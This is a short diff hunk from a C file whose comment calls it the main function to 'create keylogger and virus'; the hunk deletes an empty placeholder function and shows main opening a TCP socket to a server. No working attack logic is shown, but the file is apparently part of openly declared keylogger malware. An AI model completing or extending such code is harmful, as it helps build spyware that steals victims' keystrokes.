@@ -11,10 +11,6 @@ Main function to run to create keylogger and virus
 
 const socklen_t MAX_IP_ADDR_LEN = 16;
 
-void background_process(void) {
-  // IMPLEMENTATION HERE
-}
-
 int main(void) {
   // Open a TCP socket to connect to the server.
   int socket_descriptor = open_tcp_socket();
